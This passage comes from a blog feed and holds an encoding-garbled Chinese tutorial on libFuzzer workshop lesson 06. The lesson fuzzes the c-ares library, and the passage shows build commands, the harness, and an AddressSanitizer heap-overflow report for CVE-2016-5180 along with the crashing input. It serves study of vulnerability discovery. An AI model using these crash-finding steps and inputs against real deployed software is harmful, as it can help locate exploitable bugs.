SSL3_RECORD;</span><br></pre></td></tr></table></figure><p>è€Œç¨‹åºå¹¶æ²¡æœ‰å¯¹ç”¨æˆ·å¯æ§çš„lengthåšæ£€æŸ¥ï¼Œä»è€Œå¯¼è‡´memcpyæº¢å‡ºï¼ˆæœ‰å¯èƒ½å°†serverç«¯çš„æ•°æ®å†™å…¥åˆ°è¿”å›æ•°æ®åŒ…ä¸­è¿”å›ç»™ç”¨æˆ·ï¼‰ã€‚</p><p>åˆå­¦libfuzzerï¼Œå¦‚æœ‰çº°æ¼é”™è¯¯è¿˜çƒ¦è¯·å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚</p><h6 id="lesson06-gogogo"><a href="#lesson06-gogogo" class="headerlink" title="lesson06 gogogo!"></a>lesson06 gogogo!</h6><p>06ç»™å‡ºçš„æ˜¯CVE-2016-5180æ¼æ´ï¼Œè¯¥æ¼æ´å¯ä»¥å®ç°åœ¨ChromeOSä¸‹çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæ— ç–‘æ˜¯é«˜å±æ¼æ´ã€‚<br>PSï¼šæˆ‘è§‰å¾—åœ¨å­¦ä¹ libfuzzerçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…ä»…å±€é™å±€é™äºè·å¾—äº†ä¸€ä¸ªcrashï¼Œè¿˜è¦è¿›ä¸€æ­¥çš„å»å®šä½æ¼æ´ä¹‹æ‰€åœ¨ï¼Œåˆ†ææ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œæ€è€ƒæ¼æ´çš„åˆ©ç”¨æ–¹æ³•å’Œä¿®è¡¥æ–¹å¼ï¼Œè¿™æ‰æ˜¯æ­£ç¡®å¯¹å¾…fuzzçš„æ€åº¦ä»¥åŠæ¼æ´æŒ–æ˜çš„é­…åŠ›æ‰€åœ¨ã€‚<br>å¦‚åŒ05æ‰€ä½œçš„æ­¥éª¤ï¼Œæˆ‘ä»¬è¦å…ˆå¯¹å¼€æºåº“è¿›è¡Œç¼–è¯‘</p><p>å¦‚æœæˆ‘ä»¬å•çº¯ç›´æ¥ç¼–è¯‘è€Œä¸è¿›è¡Œç¼–è¯‘æ’æ¡©çš„è¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf c-ares.tgz</span><br><span class="line">cd c-ares</span><br><span class="line">./buildconf</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„fuzzæ•ˆæœä¸ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">06</span> git:(master) âœ— ./c_ares_fuzzer                                                                    </span><br><span class="line">INFO: Seed: <span class="number">2221841816</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">14</span> inline <span class="number">8</span>-bit counters): <span class="number">14</span> [<span class="number">0x7a7ef8</span>, <span class="number">0x7a7f06</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">14</span> PCs): <span class="number">14</span> [<span class="number">0x5700b8</span>,<span class="number">0x570198</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">4</span> ft: <span class="number">5</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">5</span>NEW    cov: <span class="number">5</span> ft: <span class="number">6</span> corp: <span class="number">2</span>/<span class="number">3</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">3</span> ShuffleBytes-ChangeByte-CopyPart-</span><br><span class="line">#<span class="number">1337</span>NEW    cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">20</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">2</span> ShuffleBytes-CrossOver-</span><br><span class="line">#<span class="number">1357</span>REDUCE cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">16</span>/<span class="number">16</span> MS: <span class="number">5</span> CrossOver-EraseBytes-CopyPart-ChangeBinInt-InsertRepeatedBytes-</span><br><span class="line">#<span class="number">524288</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">712</span>Mb</span><br><span class="line">#<span class="number">1048576</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">775</span>Mb</span><br><span class="line">#<span class="number">2097152</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">262144</span> rss: <span class="number">777</span>Mb</span><br><span class="line">#<span class="number">4194304</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">246723</span> rss: <span class="number">777</span>Mb</span><br><span class="line">#<span class="number">8388608</span>pulse  cov: <span class="number">8</span> ft: <span class="number">9</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">4096</span> exec/s: <span class="number">220752</span> rss: <span class="number">777</span>Mb</span><br></pre></td></tr></table></figure><p>å‡ºç°å¦‚æ­¤boringçš„ç»“æœçš„åŸå› å†ä¸ç¼ºå°‘äº†ç¼–è¯‘æ—¶çš„é€‰é¡¹è®¾ç½®ï¼Œå³æ²¡æœ‰åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ’æ¡©<br>æ’æ¡©æ“ä½œï¼šåœ¨å…¶ä¸­ç‰¹å®šçš„çš„ä½ç½®æ’å…¥æ±‡ç¼–ä»£ç ï¼Œå®ç°åœ¨ç¨‹åºæ‰§è¡Œåˆ°è¯¥å¤„æ—¶èƒ½å¤Ÿé€šè¿‡æ­¤å¤„çš„æ’æ¡©æŒæ¡ç¨‹åºçš„æ‰§è¡Œè·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar xzvf c-ares.tgz</span><br><span class="line">cd c-ares</span><br><span class="line">./buildconf</span><br><span class="line">./configure CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;</span><br><span class="line">make CFLAGS=</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>-fsanitize=address</code>å³å¼€å¯ASAN(Address Sanitizer)ï¼Œç¼–è¯‘æ—¶åˆ™ä¼šåœ¨ç›®æ ‡ä»£ç çš„å…³é”®ä½ç½®æ·»åŠ æ£€æŸ¥ä»£ç ï¼Œä¾‹å¦‚ï¼šmalloc(),free()ç­‰ï¼Œä¸€æ—¦å‘ç°äº†å†…å­˜è®¿é—®é”™è¯¯ï¼Œä¾¿å¯ä»¥SIGABRTä¸­æ­¢ç¨‹åºã€‚ï¼ˆå³å®Œæˆäº†ç¼–è¯‘æ’æ¡©ï¼‰<br>è¿™é‡ŒæŒ‡å®šCCé€‰é¡¹ä¹Ÿæ˜¯ä¸è§„èŒƒçš„ï¼Œæå€¡<code>CC = &quot;clang&quot; &amp;&amp; CFLAGS = &quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address&quot;</code><br>é¡ºåˆ©ç¼–è¯‘ç”Ÿæˆ.aé™æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œæ¥ç€æ˜¯ç¼–å†™fuzzeræ¥å£å‡½æ•°ã€‚<br>workshopæä¾›ç»™æˆ‘ä»¬çš„harnesså¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/nameser.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ares.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">  <span class="type">int</span> buflen;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">s</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span> *&gt;(data), size)</span>;</span><br><span class="line">  ares_create_query(s.c_str(), ns_c_in, ns_t_a, <span class="number">0x1234</span>, <span class="number">0</span>, &amp;buf, &amp;buflen, <span class="number">0</span>);</span><br><span class="line">  ares_free_string(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°harnesså°†è¾“å…¥çš„æµ‹è¯•æ ·æœ¬dataç±»å‹è½¬åŒ–ä¸ºstrings sï¼Œä¹‹åé€‰æ‹©äº†<code>ares_creat_query</code>å’Œ<code>ares_free_strings</code>ä½œä¸ºå…¥å£å‡½æ•°æ¥è¿›è¡Œfuzzã€‚<br>ç¼–è¯‘ï¼š<code>clang++ -g c_ares_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer -Ic-ares c-ares/.libs/libcares.a</code><br>è¿è¡Œåå¾ˆå¿«å¾—åˆ°äº†crashè¯´æ˜æä¾›çš„harnessæ˜¯å¾ˆæœ‰æ•ˆçš„ï¼Œæ¥å£å‡½æ•°çš„é€‰æ‹©åˆé€‚ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">06</span> git:(master) âœ— ./c_ares_fuzzer </span><br><span class="line">INFO: Seed: <span class="number">3003118136</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">11</span> inline <span class="number">8</span>-bit counters): <span class="number">11</span> [<span class="number">0x7f72c0</span>, <span class="number">0x7f72cb</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">11</span> PCs): <span class="number">11</span> [<span class="number">0x5b7740</span>,<span class="number">0x5b77f0</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">4</span> ft: <span class="number">4</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">10</span>NEW    cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">2</span>/<span class="number">3</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">3</span> ShuffleBytes-CrossOver-InsertByte-</span><br><span class="line">#<span class="number">1336</span>NEW    cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">3</span>/<span class="number">20</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">1385</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">3</span>/<span class="number">19</span>b lim: <span class="number">17</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">16</span>/<span class="number">16</span> MS: <span class="number">4</span> CopyPart-EraseBytes-InsertByte-CopyPart-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">7322</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x603000f7b654</span> at pc <span class="number">0x00000059bd4c</span> bp <span class="number">0x7fff83ba42b0</span> sp <span class="number">0x7fff83ba42a8</span></span><br><span class="line">WRITE of size <span class="number">1</span> at <span class="number">0x603000f7b654</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59bd4b</span> in ares_create_query /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">196</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59b33c</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer.cc:<span class="number">16</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x465fe6</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46e66f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x4569f9</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x41f382</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x7f19eeaeabf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">9</span> <span class="number">0x41f3f9</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer+<span class="number">0x41f3f9</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x603000f7b654</span> is located <span class="number">0</span> bytes to the right of <span class="number">20</span>-<span class="type">byte</span> region [<span class="number">0x603000f7b640</span>,<span class="number">0x603000f7b654</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x552ef0</span> in malloc /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cpp:<span class="number">145</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59b826</span> in ares_create_query /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">133</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x59b33c</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c_ares_fuzzer.cc:<span class="number">16</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x465fe6</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46b649</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x46e66f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x4569f9</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x41f382</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x7f19eeaeabf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/<span class="number">06</span>/c-ares/ares_create_query.c:<span class="number">196</span>:<span class="number">3</span> in ares_create_query</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c06801e7670</span>: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7680</span>: fd fd fd fd fa fa fd fd fd fa fa fa fd fd fd fa</span><br><span class="line">  <span class="number">0x0c06801e7690</span>: fa fa fd fd fd fa fa fa fd fd fd fa fa fa fd fd</span><br><span class="line">  <span class="number">0x0c06801e76a0</span>: fd fa fa fa fd fd fd fd fa fa fd fd fd fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76b0</span>: fd fd fd fa fa fa fd fd fd fa fa fa fd fd fd fa</span><br><span class="line">=&gt;<span class="number">0x0c06801e76c0</span>: fa fa fd fd fd fa fa fa <span class="number">00</span> <span class="number">00</span>[<span class="number">04</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76d0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76e0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e76f0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7700</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c06801e7710</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">7322</span>==ABORTING</span><br><span class="line">MS: <span class="number">4</span> ChangeByte-ChangeBinInt-CopyPart-ChangeBit-; base unit: <span class="number">900229</span>d109e2354708da1b4fe903c1ef0e741ab8</span><br><span class="line"><span class="number">0xdc</span>,<span class="number">0x2e</span>,<span class="number">0x5c</span>,<span class="number">0x2e</span>,</span><br><span class="line">\xdc.\\.</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-55</span>bfecc1f01482c0ec080b0da9ab7f50cd9fa363</span><br><span class="line">Base64: <span class="number">3</span>C5cLg==</span><br></pre></td></tr></table></figure><p>SUMMARYä¸­:<code>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/06/c-ares/ares_create_query.c:196:3 in ares_create_query</code>ï¼Œäº†è§£åˆ°æ¼æ´æ­£ä½äº<code>ares_create_query</code>å‡½æ•°ä¸­ã€‚å®šä½ä¸€ä¸‹æ¼æ´ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ares_create_query.c:196:3</span></span><br><span class="line"><span class="comment">/* Finish off the question with the type and class. */</span></span><br><span class="line">DNS_QUESTION_SET_TYPE(q, type);</span><br><span class="line">DNS_QUESTION_SET_CLASS(q, dnsclass); <span class="comment">//æ¼æ´ç‚¹ï¼Œè¯¥å¤„å­˜åœ¨heap_overflow</span></span><br></pre></td></tr></table></figure><p>ä½†å¯¹äºæ¼æ´çš„å…·ä½“äº§ç”Ÿæ–¹å¼è¿›è¡Œæº¯æºçš„è¯å°±è¦å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚</p><p>åˆ°è¿™é‡Œå¯¹libfuzzerçš„åŸºæœ¬æ“ä½œå·²ç»æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä½†fuzzçš„å¯¹è±¡éƒ½æ˜¯è§„æ¨¡è¾ƒå°çš„å¼€æºåº“ã€‚å½“æˆ‘ä»¬é¢å¯¹å¤§è§„æ¨¡çš„å¼€æºé¡¹ç›®ä»¥åŠéœ€è¦è¿›è¡Œé•¿æ—¶é—´çš„æµ‹è¯•å·¥ä½œæ—¶ï¼Œå¦‚ä½•ç»§ç»­ä¿æŒfuzzçš„é«˜æ•ˆè¿›è¡Œä»¥å¾—åˆ°crashä¾¿æ˜¯æˆ‘ä»¬è¦ç»§ç»­ç ”ç©¶çš„è¯¾é¢˜ï¼Œè¿™å°±æ¶‰åŠåˆ°ä¸€äº›å¯¹ç¼–è¯‘é€‰é¡¹çš„è®¾ç½®ä»¥åŠå¯¹fuzzçš„ä¸€äº›é¢å¤–æ¡ä»¶çš„è®¾å®šï¼Œè¿™äº›éƒ½ä¼šå¯èƒ½ä¼šå½±å“åˆ°fuzzçš„æ•ˆç‡ï¼Œç­‰å¾…è¿™æˆ‘ä»¬è¿›ä¸€æ­¥çš„ç ”ç©¶ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn SringsIPC(P1)</title>
      <link href="/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/"/>
      <url>/2020/11/20/kernel_pwn%20%E4%BB%8E%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%8B%AC%E5%86%99%E5%88%B0%E6%8F%90%E6%9D%83(1)/</url>
      
